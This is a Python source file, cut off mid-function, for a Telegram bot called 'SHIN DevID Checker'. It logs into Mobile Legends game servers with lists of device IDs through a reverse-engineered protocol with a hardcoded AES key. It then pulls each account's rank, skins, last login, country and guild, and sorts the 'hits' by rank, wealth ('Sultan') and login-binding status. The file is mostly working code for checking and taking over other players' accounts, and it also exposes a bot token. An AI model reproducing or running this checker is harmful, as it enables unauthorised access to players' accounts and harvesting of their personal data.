#!/usr/bin/env python3
# ===================================================================
# SHIN DevID Checker — Telegram Bot v2.1
# -------------------------------------------------------------------
#   • Expanded tag probing for collector / last_login / squad
#   • Separate guild-info + hero-history query attempts
#   • /raw admin command — dumps EVERY response for tag hunting
#   • Watermark: @SHINRT771
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib
import struct, re, logging, asyncio, zipfile, shutil
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
import requests
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, Document
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import BadRequest, NetworkError
from telegram.request import HTTPXRequest
from telegram.constants import ParseMode

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "SHIN DevID Checker"
BOT_VERSION = "2.1"
BRAND       = "@SHINRT771"

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

MAX_THREADS_DEFAULT = 10
MAX_THREADS_LIMIT   = 50
MIN_THREADS         = 1

TZ_WIB = timezone(timedelta(hours=7))

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR  = os.path.join(BASE_DIR, "SHIN_DEVID_OUTPUT")
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")
JSON_DIR    = os.path.join(OUTPUT_DIR, "json_hits")

for d in (DATA_DIR, RESULTS_DIR, OUTPUT_DIR, JSON_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE       = Path(DATA_DIR) / "users.json"
KEYS_FILE        = Path(DATA_DIR) / "keys.json"
CONFIG_FILE      = Path(DATA_DIR) / "config.json"
TXN_COUNTER_FILE = Path(DATA_DIR) / "txn_counter.txt"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL CONSTANTS
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

FOLDERS = {
    "detail":      "03_Hasil_Detail",
    "rank_warrior":"04_Rank_Warrior",
    "rank_elite":  "05_Rank_Elite",
    "rank_master": "06_Rank_Master",
    "rank_gm":     "07_Rank_Grandmaster",
    "rank_epic":   "08_Rank_Epic",
    "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic",
    "v2l_active":  "11_V2L_Active",
    "v2l_inactive":"12_V2L_Inactive",
    "sultan":      "13_Sultan",
    "error":       "99_Error",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)

ensure_dirs()

# ────────────────────────────────────────────────────────────────
# LOGGING
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
log = logging.getLogger("shinbot")

# ────────────────────────────────────────────────────────────────
# RANK MAPPING
# ────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal {stars}"
        if stars >= 50:  return f"Mythical Glory {stars}"
        if stars >= 25:  return f"Mythical Honor {stars}"
        return f"Mythic {stars}"
    ranks = [
        (105, "Legend",      5, ["V","IV","III","II","I"]),
        (75,  "Epic",        5, ["V","IV","III","II","I"]),
        (45,  "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25,  "Master",      4, ["IV","III","II","I"]),
        (10,  "Elite",       3, ["IV","III","II","I"]),
        (1,   "Warrior",     3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset  = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star    = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} {star}"
    return "Warrior III 1"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior"    in rt: return "warrior"
    if "elite"      in rt: return "elite"
    if "grandmaster"in rt: return "gm"
    if "master"     in rt and "grand" not in rt: return "master"
    if "epic"       in rt: return "epic"
    if "legend"     in rt: return "legend"
    if "mythic"     in rt or "immortal" in rt or "glory" in rt or "honor" in rt: return "mythic"
    return "other"

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT  = 2
    DOUBLE = 3
    STRING = 4
    LIST   = 5
    DICT   = 6
    STRUCT_BEGIN = 7
    STRUCT_END   = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data   = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr   = self.data[self.offset]
        tag   = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT:  return tag, struct.unpack("<f", self._read_varint().to_bytes(4,'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if dtype == SdpDataType.STRING:
            l   = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try:    return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l   = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l   = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

def sdp_to_plain(obj):
    if isinstance(obj, SdpStruct):
        return {k: sdp_to_plain(v) for k, v in obj.items()}
    if isinstance(obj, dict):
        return {k: sdp_to_plain(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [sdp_to_plain(v) for v in obj]
    if isinstance(obj, bytes):
        try: return obj.decode('utf-8')
        except: return obj.hex()
    return obj

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host     = host
        self.port     = port
        self.sequence = 1
        self.socket   = None
        self.queue    = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(10)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket   = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt   = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp  = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size  = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data       = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1:  data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data   = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3:  data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None


class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei    = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid    = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()


class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id  = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei        = raw[:32] if len(raw) >= 32 else raw
        self.android     = raw[32:48] if len(raw) >= 48 else ""
        self.adid        = raw[48:] if len(raw) > 48 else ""
        self.account_id  = 0
        self.session_key = ''
        self.zone_id     = 0
        self.game_host   = ''
        self.game_port   = 0
        self.creation_ts = 0
        self.ban_status  = "NORMAL"
        # Debug: capture every response we see
        self.debug_responses: List[Dict[str, Any]] = []

    def _rec(self, label: str, req_pid: int, resp_pid: Optional[int], res):
        """Record a debug entry."""
        self.debug_responses.append({
            "label": label,
            "req_pid": req_pid,
            "resp_pid": resp_pid,
            "data": sdp_to_plain(res) if res else None,
        })

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        self._rec("login", 1, pid, res)
        if pid == 2 and res:
            self.account_id  = res.get(0)
            self.session_key = res[1]
            self.zone_id     = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status  = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban','suspend','freeze','limit')):
                    self.ban_status = f"BANNED: {v}"
                    return False
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        self._rec("get_server", 5, pid, res)
        if pid == 6 and res:
            host, port       = res[1].split(':')
            self.game_host   = host
            self.game_port   = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            self._rec("game_handshake", 10001, pid, res)
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            self._rec("ban_check", 10101, pid, res)
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo  = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                d, h, m, s = binfo.get('endtime_day','0'), binfo.get('endtime_hour','0'), binfo.get('endtime_min','0'), binfo.get('endtime_sec','0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            self._rec("lookup_player", 11153, pid, res)
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            self._rec("role_info", 10128, pid, res)
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            self._rec("skin_info", 10143, pid, res)
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

    def get_player_detail(self, role_id: int, zone_id: int):
        """
        Rich profile query. PID 10226/10227 in some builds returns the
        big 'player details' blob (collector, login ts, achievements, etc.).
        Trying multiple candidates.
        """
        for req_pid, resp_candidates in [
            (10226, [10227]),
            (10208, [10208]),
            (10201, [10202]),
            (10191, [10192]),
            (10145, [10146]),
        ]:
            try:
                self.send_data(req_pid, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                for _ in range(4):
                    pid, res = self.recv_data()
                    self._rec(f"player_detail_{req_pid}", req_pid, pid, res)
                    if pid in (-1, None): break
                    if pid in resp_candidates and res:
                        return res
            except: pass
        return None

    def get_guild_info(self, role_id: int, zone_id: int):
        """
        Guild/squad info. Known PIDs in various builds:
        14001/14002, 12301/12302, 10231/10232.
        """
        for req_pid, resp_candidates in [
            (14001, [14002]),
            (12301, [12302]),
            (10231, [10232]),
            (10301, [10302]),
        ]:
            try:
                self.send_data(req_pid, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                for _ in range(4):
                    pid, res = self.recv_data()
                    self._rec(f"guild_{req_pid}", req_pid, pid, res)
                    if pid in (-1, None): break
                    if pid in resp_candidates and res:
                        return res
            except: pass
        return None

    def get_hero_history(self, role_id: int, zone_id: int):
        """
        Recent/hero usage history. Known candidate PIDs:
        11001/11002, 12005/12006, 10241/10242.
        """
        for req_pid, resp_candidates in [
            (11001, [11002]),
            (12005, [12006]),
            (10241, [10242]),
            (12305, [12306]),
        ]:
            try:
                self.send_data(req_pid, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                for _ in range(4):
                    pid, res = self.recv_data()
                    self._rec(f"hero_history_{req_pid}", req_pid, pid, res)
                    if pid in (-1, None): break
                    if pid in resp_candidates and res:
                        return res
            except: pass
        return None

    def get_collector_info(self, role_id: int, zone_id: int):
        """
        Collector tier / collector points. Known candidates:
        10273/10274, 10251/10252, 10311/10312.
        """
        for req_pid, resp_candidates in [
            (10273, [10274]),
            (10251, [10252]),
            (10311, [10312]),
            (11011, [11012]),
        ]:
            try:
                self.send_data(req_pid, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                for _ in range(4):
                    pid, res = self.recv_data()
                    self._rec(f"collector_{req_pid}", req_pid, pid, res)
                    if pid in (-1, None): break
                    if pid in resp_candidates and res:
                        return res
            except: pass
        return None

# ────────────────────────────────────────────────────────────────
# V2L DETECTION
# ────────────────────────────────────────────────────────────────

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    for pid_req, pid_resp_list in [
        (10208, [10208]),
        (10145, [10146, 10160]),
        (10143, [10144]),
    ]:
        try:
            conn.send_data(pid_req, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid in pid_resp_list and res:
                    data = dict(res)
                    for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                        val = data.get(tag)
                        if val is None:
                            nested = data.get(tag, {})
                            if isinstance(nested, dict):
                                for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                                    val = nested.get(subtag)
                                    if val is not None: break
                        if val is not None:
                            if isinstance(val, (int, float)):
                                return "Enabled" if int(val) > 0 else "Disabled"
                            if isinstance(val, str):
                                if val.lower() in ("1","true","enabled","yes"): return "Enabled"
                                if val.lower() in ("0","false","disabled","no"):  return "Disabled"
        except: pass
    return "N/A"

# ────────────────────────────────────────────────────────────────
# FIELD EXTRACTION HELPERS
# ────────────────────────────────────────────────────────────────

def _first_string(d, tags) -> Optional[str]:
    """Return first non-empty string value at any of the given tags."""
    for t in tags:
        v = d.get(t)
        if isinstance(v, str) and v.strip():
            return v.strip()
        if isinstance(v, (SdpStruct, dict)):
            # search one level deep
            for sub in v.values():
                if isinstance(sub, str) and sub.strip():
                    return sub.strip()
    return None

def _first_int(d, tags) -> Optional[int]:
    """Return first non-zero int value at any of the given tags."""
    for t in tags:
        v = d.get(t)
        if isinstance(v, bool): continue
        if isinstance(v, int) and v != 0:
            return v
        if isinstance(v, (SdpStruct, dict)):
            for sub in v.values():
                if isinstance(sub, int) and not isinstance(sub, bool) and sub != 0:
                    return sub
    return None

def _looks_like_unix_ts(v) -> bool:
    """Sanity check for a unix timestamp (between 2015 and 2035)."""
    if not isinstance(v, (int, float)): return False
    v = int(v)
    return 1420070400 <= v <= 2051222400   # 2015-01-01 .. 2035-01-01

def _extract_last_login(*sources: dict) -> Optional[str]:
    """
    Try to find a plausible last-login timestamp from a wide set of tags
    across multiple response dicts.
    """
    # Common tag candidates for login time
    tags = [44, 40, 41, 43, 45, 46, 47, 48, 49, 50, 51, 52, 60, 61, 63, 70, 71, 80]
    for src in sources:
        if not isinstance(src, dict): continue
        for t in tags:
            v = src.get(t)
            if _looks_like_unix_ts(v):
                try:
                    return datetime.fromtimestamp(v, tz=timezone.utc).astimezone(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")
                except: pass
    return None

def _extract_collector_info(*sources: dict) -> Tuple[Optional[str], Optional[int]]:
    """
    Return (collector_tier_name, collector_points).
    Collector tier comes from a level field usually; points from a big counter.
    """
    tier_tags = [12, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35]
    point_tags = [11, 13, 14, 15, 27, 28, 29, 36, 37, 38, 39, 84, 90, 91, 92, 93, 94, 95]
    collector_tier = None
    collector_points = None
    for src in sources:
        if not isinstance(src, dict): continue
        if collector_points is None:
            for t in point_tags:
                v = src.get(t)
                if isinstance(v, int) and not isinstance(v, bool) and v > 1000:
                    collector_points = v
                    break
        if collector_tier is None:
            for t in tier_tags:
                v = src.get(t)
                if isinstance(v, str) and any(k in v.lower() for k in ("collector","renowned","grand","elite","expert","master")):
                    collector_tier = v
                    break
    return collector_tier, collector_points

def _extract_squad_name(*sources: dict) -> Optional[str]:
    """
    Squad/guild NAME (string), NOT the numeric guild id.
    Falls back to None if only numbers found.
    """
    name_tags = [62, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
    for src in sources:
        if not isinstance(src, dict): continue
        for t in name_tags:
            v = src.get(t)
            if isinstance(v, str):
                s = v.strip()
                if not s: continue
                # Heuristics: not all-numeric, reasonable length
                if s.isdigit(): continue
                if len(s) > 40: continue
                if s.lower() in ("none", "n/a", "null"): continue
                return s
            if isinstance(v, (SdpStruct, dict)):
                for sub in v.values():
                    if isinstance(sub, str) and sub.strip() and not sub.strip().isdigit() and 1 < len(sub) <= 40:
                        return sub.strip()
    return None

def _extract_hero_history(*sources: dict) -> List[str]:
    """
    Return a list of hero names (strings) if present in any response.
    """
    for src in sources:
        if not isinstance(src, dict): continue
        for t, v in src.items():
            if isinstance(v, list) and v:
                # List of strings that look like hero names?
                strings = [x for x in v if isinstance(x, str) and x.strip() and not x.isdigit()]
                if strings:
                    return strings[:5]
                # List of dicts each with a name field?
                names = []
                for item in v:
                    if isinstance(item, (SdpStruct, dict)):
                        for sv in item.values():
                            if isinstance(sv, str) and sv.strip() and not sv.isdigit():
                                names.append(sv.strip())
                                break
                if names:
                    return names[:5]
    return []

def _extract_countries(*sources: dict) -> Tuple[Optional[str], Optional[str]]:
    """Try to find login_country / reg_country — 2-letter strings."""
    login_c = reg_c = None
    for src in sources:
        if not isinstance(src, dict): continue
        for t, v in src.items():
            if isinstance(v, str) and len(v) == 2 and v.isalpha():
                lv = v.lower()
                if login_c is None and t in (28, 25, 22, 20):
                    login_c = lv
                elif reg_c is None and t in (27, 24, 21, 19):
                    reg_c = lv
    return login_c, reg_c

def _extract_matches(*sources: dict) -> Optional[int]:
    tags = [4, 5, 6, 7, 8, 11, 12, 13, 14, 15]
    for src in sources:
        if not isinstance(src, dict): continue
        for t in tags:
            v = src.get(t)
            if isinstance(v, int) and not isinstance(v, bool) and 0 < v < 100000:
                return v
    return None

# ────────────────────────────────────────────────────────────────
# RESULT FORMATTING
# ────────────────────────────────────────────────────────────────

def _breakdown_to_block(bd: dict) -> str:
    if not bd: return "    N/A"
    lines = []
    labels = [
        ('grand', 'Grand'),
        ('exquisite', 'Exquisite'),
        ('deluxe', 'Deluxe'),
        ('exceptional', 'Exceptional'),
        ('common', 'Common'),
    ]
    for key, label in labels:
        v = bd.get(key)
        if v is not None:
            lines.append(f"    {label}: {v}")
    return "\n".join(lines) if lines else "    N/A"

def format_card_v2(device: str, data: dict, found_at: Optional[str] = None) -> str:
    acc   = data.get("account_id", "?")
    zone  = data.get("zone_id", "?")
    nick  = data.get("nickname") or "N/A"
    level = data.get("level") or "N/A"
    heroes= data.get("hero_count") if data.get("hero_count") is not None else "N/A"
    skins = data.get("skin_count") if data.get("skin_count") is not None else "N/A"
    matches = data.get("matches") if data.get("matches") is not None else "N/A"

    bd = data.get("skin_breakdown", {}) or {}
    bd_block = _breakdown_to_block(bd)

    cur_rank = data.get("current_rank") or "Unranked"
    max_rank = data.get("highest_rank") or "N/A"

    collector     = data.get("collector") or "N/A"
    coll_points   = data.get("collector_points")
    if isinstance(coll_points, (int, float)) and coll_points > 0:
        coll_points = f"{int(coll_points):,}"
    else:
        coll_points = "N/A"
    achievement   = data.get("achievement") if data.get("achievement") is not None else "N/A"
    location      = data.get("location") or "NOT FOUND"
    last_login    = data.get("last_login") or "N/A"
    login_ctry    = data.get("login_country") or "N/A"
    reg_ctry      = data.get("reg_country") or "N/A"
    squad         = data.get("squad") or "N/A"
    hero_history  = data.get("hero_history") or []
    if isinstance(hero_history, list):
        hero_history = ", ".join(str(x) for x in hero_history[:5]) if hero_history else "N/A"
    else:
        hero_history = str(hero_history)

    if found_at is None:
        found_at = datetime.now(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")

    sep  = "=" * 60
    thin = "─" * 60

    lines = [
        sep,
        f"DEVICE ID    : {device}",
        f"ACCOUNT ID   : {acc}",
        f"ZONE ID      : {zone}",
        thin,
        f"NICK         : {nick}",
        f"PLAYER ID    : {acc}",
        f"SERVER       : {zone}",
        f"LEVEL        : {level}",
        f"HEROES       : {heroes}",
        f"SKINS        : {skins}",
        f"MATCHES      : {matches}",
        thin,
        "SKIN BREAKDOWN:",
        bd_block,
        thin,
        f"CURRENT RANK : {cur_rank}",
        f"HIGH RANK    : {max_rank}",
        thin,
        f"COLLECTOR    : {collector}",
        f"COLL POINTS  : {coll_points}",
        f"ACHIEVEMENT  : {achievement}",
        thin,
        f"LOCATION     : {location}",
        f"LAST LOGIN   : {last_login}",
        f"LOGIN CTRY   : {login_ctry}",
        f"REG CTRY     : {reg_ctry}",
        f"SQUAD        : {squad}",
        f"HERO HISTORY : {hero_history}",
        f"FOUND AT     : {found_at}",
        sep,
        f"👑 {BRAND}",
    ]
    return "\n".join(lines)

def card_to_json(device: str, data: dict) -> dict:
    return {
        "device_id":        device,
        "account_id":       data.get("account_id"),
        "zone_id":          data.get("zone_id"),
        "nickname":         data.get("nickname"),
        "level":            data.get("level"),
        "heroes":           data.get("hero_count"),
        "skins":            data.get("skin_count"),
        "matches":          data.get("matches"),
        "skin_breakdown":   data.get("skin_breakdown", {}),
        "current_rank":     data.get("current_rank"),
        "highest_rank":     data.get("highest_rank"),
        "collector":        data.get("collector"),
        "collector_points": data.get("collector_points"),
        "achievement":      data.get("achievement"),
        "location":         data.get("location"),
        "last_login":       data.get("last_login"),
        "login_country":    data.get("login_country"),
        "reg_country":      data.get("reg_country"),
        "squad":            data.get("squad"),
        "hero_history":     data.get("hero_history", []),
        "ban_status":       data.get("ban_status"),
        "v2l_status":       data.get("v2l_status"),
        "found_at":         datetime.now(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S"),
    }

# ────────────────────────────────────────────────────────────────
# SAVE ENGINE
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'v2l_active': 0, 'v2l_inactive': 0,
    'banned': 0, 'warrior': 0, 'elite': 0, 'master': 0,
    'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0,
}
COUNTER_LOCK = threading.Lock()
save_lock    = threading.Lock()

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def parse_skin_breakdown(slist: list) -> Dict[str, int]:
    tiers = {'grand': 0, 'exquisite': 0, 'deluxe': 0, 'exceptional': 0, 'common': 0}
    if isinstance(slist, list):
        for s in slist:
            if isinstance(s, dict):
                q = s.get(2, 0)
                if q in (16, 17, 21):  tiers['grand'] += 1
                elif q in (7, 15):     tiers['exquisite'] += 1
                elif q in (5, 9, 2):   tiers['deluxe'] += 1
                elif q == 1:           tiers['exceptional'] += 1
                else:                  tiers['common'] += 1
    return tiers

def save_account_v2(account_info: dict, player_data: dict, out_dir: str = None) -> Optional[str]:
    base = out_dir if out_dir else OUTPUT_DIR
    device   = account_info.get('Device id', '')
    acc      = account_info.get('role_id', '?')
    zone     = account_info.get('zone_id', '?')
    ban_stat = player_data.get('ban_status', 'NORMAL')
    is_banned = 'ban' in str(ban_stat).lower()

